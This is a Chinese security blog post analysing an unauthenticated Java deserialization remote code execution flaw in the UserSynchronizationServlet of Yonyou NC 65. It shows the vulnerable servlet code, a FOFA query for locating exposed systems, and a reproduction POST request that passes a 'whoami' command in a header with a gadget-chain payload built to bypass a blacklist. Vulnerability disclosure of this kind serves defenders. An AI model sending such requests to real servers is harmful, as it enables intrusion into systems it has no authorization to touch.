---
title: "用友NC UserSynchronizationServlet反序列化代码执行RCE漏洞"
source: https://mrxn.net/jswz/yonyou-nc-UserSynchronizationServlet-rce.html
asset_dir: assets/用友nc-usersynchronizationservlet反序列化代码执行rce漏洞
---

# 用友NC UserSynchronizationServlet反序列化代码执行RCE漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/10/7 08:42
- 728浏览
- [0评论](#comment)
- 13分钟阅读

深入探索

安全

身份验证

软件

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)NC是用公司推出的一款企业管理[软件](#)，涵盖财务、供应链、生产制造等多个业务领域，旨在帮助企业实现信息化管理。用友NC的`UserSynchronizationServlet`组件存在反序列化漏洞。该Servlet在处理用户请求时，可能对接收到的序列化数据（如Java的`ObjectInputStream`）未进行安全检查，直接进行反序列化操作。攻击者可以构造恶意的序列化对象，其中包含可执行的代码，当`UserSynchronizationServlet`反序列化该恶意对象时，就会触发代码执行。该漏洞可能允许攻击者在服务器上[执行任意代码](https://mrxn.net/tag/rce)，从而完全控制服务器，窃取敏感数据，篡改系统配置，或进行其他恶意活动，对企业的业务系统和数据安全构成严重威胁。

漏洞预警服务

# 影响版本

NC 65

# fofa语法

> app="用友-UFIDA-NC"

# 漏洞分析

直接看下`UserSynchronizationServlet`的实现

```
public class UserSynchronizationServlet extends HttpServlet {
    private static final long serialVersionUID = 5734336943919144855L;

    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        ObjectInputStream in = new ObjectInputStream(request.getInputStream());
        HashMap<Object, Object> headInfo = new HashMap();

        try {
            headInfo = (HashMap)in.readObject();
```

由于代码在处理 HTTP 请求时，直接对用户传入的输入流进行 Java 反序列化操作（**`in.readObject()`**），且该操作发生在任何身份验证或安全检查之前，造成了未经身份验证的**远程代码执行（[RCE](https://mrxn.net/tag/rce)）漏洞**。攻击者可以构造恶意的序列化数据流，在服务器反序列化时执行任意代码。

物流软件安全

深入探索

Web安全书籍

编程语言教程

技术文章订阅

# 漏洞复现

```
POST /servlet/UserSynchronizationServlet?pageId=login HTTP/1.1
Host: nc.mrxn.net
Content-Type: application/x-java-serialized-object
X-Authorization: whoami

{{file(/tmp/javachains.ser)}}
```

使用`Java Chains` 的`TransformerWithDefiningClassLoader2`构造**绕黑名单**进行[命令执行](https://mrxn.net/tag/rce)回显payload

[![用友NC UserSynchronizationServlet反序列化代码执行RCE漏洞](images/img-001-b57541fc0e74.webp)](https://image.mrxn.net/9f4fd82858d74bb49e1dc0bdab7ecf70.webp)

[![用友NC UserSynchronizationServlet反序列化代码执行RCE漏洞](images/img-002-d282c0c38b05.webp)](https://image.mrxn.net/82289231c30d4ee88852614a27e554d0.webp)

成功执行命令并回显执行结果

安全工具开发

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#rce](https://mrxn.net/tag/rce)
- [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALd0lEQVR4Aeyb0XbbRgxEdfv//9wanlyaALmmnDS2HugTdHYGA+xqQUV2kv7zeDz+/Z349+LLntOmLpr/KrfuDGcvPeqi+gqnb3Lrpi7/HayBvNXdv17lBraBvE378UxcHRx4AJsNaHxLjIV7Q/zyYTtQiB8+UBN8aIDy9jqB97NBUAOEewYIn3nounnR+ivUX7gNpMgdP38Dh4FApg4dnz2qT4P+K67vCu0D/VzqZ2jPmXtWh+ylX7Sf/AohfaDjWd1hIGemW/u+G/jfBgJ9+j5FEH2+pJmH7oNw6Dj7fMbnHnrh93vaY4/us9d+d/2/DeR3D3DX9Rv444FAnjafEhG67rYQHYL6n0X7iJA+sMbpda+pQ3qoX+Hsc+V/Jv/HA3lmk9vz/A0cBuLUJ65a6jMPPHgLdehPnbponQjxQ1B9ovVnqNecXIT0nvkVnzqk3n5XaP3Es7rDQM5Mt/Z9N7ANBDJ1+Bzn0SD+qa84dD90bp1PE5zn9UHygNIS7bk0/EoA7z/B/6Lva2D7CV9dhO6fOiQP56i/cBtIkTt+/gb+8an5Kl4dHfI02BfCrYPwq/z0y0XrC9UmVq4Csucqr17eCoi/1hUQrk+sXMXkpX017neIt/gieBgI5CmA4DwnRIfgzPtEqEN8U5fDed76FULq4IizBuKZuhySh6C6CF2fZ58+6H7oXP8ZHgZyZrq177uBbSDQpzifAkhefaJHhnOfeeug+yBc3wqtX+Wf0e0B2VMu2kMuqosr3Tz0/lOX73EbyF681z93A//A+RQ9kk+BCPFDx+mXQ3zyP8DTUs+1R42Qvc2pi+oQnzqcc/3TB/HP/OTWrfTK3++QuoUXiu3nkHkmyNSh42q60H32m36Iz7yoT1zpkPrp03+G0GsgfHoh+ld673tA6tUgHM7xzHe/Q7yVF8HtMwQyRZ+OFUL3zddhnTrED0H16VOH+MxDuPmpQ/LwgdNrzdTl4vRBepqHztVXaD9x5dvr9ztkfxsvsN4+Q1ZThDwVEFz5fC0QHwTVJ0Ly0PHZ/rPfnq96QN9rX1NrSL7W+7CfCPHJVwjx2Wv6oOfLd79D6hZeKA6fIZCpQXA1VTjPT/+KX90BpP/0rfqVPr2Tl6dCHbJHafswPxHin7ockoegugjRIbjf0/X9DvG2XgS3zxDP46TkkGnKzYvqX0XrReuh7zd16HkIB7ReYtvzzQ1sfysIvCn9F/Cet06E6BC0yrwI53mIDh94v0O8xRfB7TPEac5zTR0+pglsduD9KYLn0EKIf+4jXyGkzj6FeuGYq/wM/VOXmxchfSGoLloHyUNQfaJ1e7zfIfOWfphvnyGQaULQqUG451QXIXm5vmdx1k1uH8g+clF/IXQPhENHaydWjwqI3zx0Xp4K6Lp+sTwVK64O6QM87nfI47W+lp8hkKnN40J0CNYTUKGv1hVysbR9QOqho37ourUQ/cynJlojFyE9IKguWgfJy81PhHMfRNcPn/Py3e+QuoUXisNA5tMgh0xX7muA6NDR/ESIzz6iPkhebh6iy89w1kx+VrPX9EPfC8LNrxDis6e+ydXP8DCQM9Otfd8NHAYC51P2SJC8fDX9qUPqVvrsN33mJ0L6wvW/vYUPLxzXq96eRYTUyic+Ho/3Vurv5Mn/HAbyZN1t+0s3sBwI5CmAoPvPqUPyU59+8xA/BPVNhJ6f9dO/55BaCJqzhzj1FVcXZ706ZD8IqouzTr7H5UBscuP33sDhJ/Wr7eF8+hDdac8+0PP6JlqnDqmDoHnovHTomj3E8jwT0PusaiA+CE4fRIeO07fn9ztkfxsvsN4GcvUUmZ84XwPkaVCHcOumDslD0LxonbjSzRfqgfSEc9QnQnzVYx8QHTpaJ+5r9mvzIvQ+8MG3gWi+8WdvYPuzLI+xn2yt1UXINOUTq6ZCvdYVkDoIlrYP/SLEBx3Ni/CRV/sqQnpYB+EQVPe88hVCr9M36ycv3/0OqVt4obgH8kLDqKMcvu2Fj7dbGWacvc2m54zPOsg+EJw10z+5fvVCtYmVq1jplaswX+uzMC/qkYsrHfprhXD9hfc7xFt8ETwMpKZUAZme54Rw6Gi+airkInR/eSrM17pCDud+iL7yQfKAlgPWPhUzAbz/A42pyyF5CE59cogPguZXCPEB91/hPl7s6/BtL2RanrOeqIoVV4dep77C6llhvtb7UIfeV4/5P0FIb3uKEB2C6u4lF9XFqcufwcNvWTa98WduYBuI05vHgDwl6tC5uvWQPARXeXWID4LqE2f/mS+up9YVk0Pfwzx0vWorzNd6H3Du1wM9D89x4P4MebzY1+HnkPlUrLi6OF+Xugj9KdFvXpy6HFKvTzS/R3OQGnPqclEduh861ydaL17pkH4rX/XZfssqcsfP38ByIHOKcsiUPTqEQ1B9ovWPx8yEw3m9dWLcX/svnPf+WpfH+88qkF7wgY9fXxDtFz2ArwHig+DeuBzI3nSvv+8GDj+HuDVkehBUd8orrg69DjrXt0I490PXPU+hvSCe0vZhXg3ig+DM67vSZ35ySH8Izr76C+93SN3CC8U2kM+mtj8vZMrQce+ptf0gvtIq1Gu9j5WuB9JHH4TDEa0RoXvURXvKIX75Cq0ToddB5/pmP/XCbSDTdPOfuYHDQCBTrWntw+OpyUV1Uf0KIftNn32g5yHc/L5OTYR4955aw7lunQjxQcfqUQHneuUq7COWdhWHgVwV3Pm/ewPLgUCmP7eHc10fJA9B9YlwnodzfT5lcPTBUat9Z21pFeqQOuhYngp9YmkVKz51+Lxv9TKWA9Fw4/fewPLPspwy9Omqe8zJp25eXOUh+5iH8Ks684XWiqVVyMXSKuDzPfRDfJND9OpVAeH6xMpVyOHcV/n7HVK38EJxGAisp1fnhuRr4hWl7aO0CogPgntPraHrVXMW0H0QDsHqdRXQvfA5v+o385B+nv+r+b3/MJB98l5//w1c/lnWnLoc8lRA0KNDuD4RoutTl0PPq0+0Ttzn1eC8l/kr3PestX74vC8kDx2rRwVEr/U+IDpw/43h48W+tu+yPJdPg6guQqYp1wfR5ebFlT7zkD4QNC/CuV556Dk453CuV48KSN4zQ3jl9mF+r9X6SjcP6SsvvD9D6gZfKA4DgUwNgp61pncW5kVIHQSv9Jmfe8y8XITsAx//W/TsIbdGhNTKV7iqn/5nfbDe9zCQucnNv/cGlt9lraYNmS501C+uXsbMQ/pM3Xp1UR1SJy+EaNCxcr8XvcoziGah7wfh5idaL0L8wP1d1uPFvrbvspyWuDqneVEfZMpyEc518/aB7oPO9YvWneH0QHpNrz4Rug/CITh90PXZX35VZ77w/gypW3ih2D5DINOG53C+Bp8GSL15dRF6fvqg56Fz/SIkDyhtCLz/W6q5N3Td/FY4FjMvF4f9fU9gyhu3Dnj3bom3xf0OebuEV/q1DcSpXeE8vH7o0/6qDuf1c7/J3adw5uTwtd4Qf/WsWPVRn1g1FVN/hm8DecZ8e/7+DRwGAnk6oOOzR6kno0J/rSvkYmkVKw7Z3/xESB6OqLf6nwWkRp84vdB95qHr1kN06Gj+GTwM5Jmi2/P3buCPBwJ5GlZPDyR/9RLgOZ/72E9eODXoPSG8vBUQDh1nHznEV7UV6rXex9QnX/HS/3gg1eSO/+8GfmwgkKcNgvsn7GwN8c2XDtGBmXrYZyaA9+//Z14OyUPQevPyidD90Pn0y+1b+GMD8TA39hs4DKSmdBa97IPphTwNVxzi++jQV9DzEG5f3ZOXrgapgY7my1sBydd6H1c+SB10tMesVxchdfI9HgayT97r77+BbSCQqcHneHVESP30+dSI5p/lkL7Q0T6FkFytK+wtllZxxctzFtD767GfqD4Rej2EwwduA5nFN/+ZG7gH8jP3vtz1PwAAAP//lu43UQAAAAZJREFUAwDGnP6/wKz5DgAAAABJRU5ErkJggg==)

手机扫码阅读
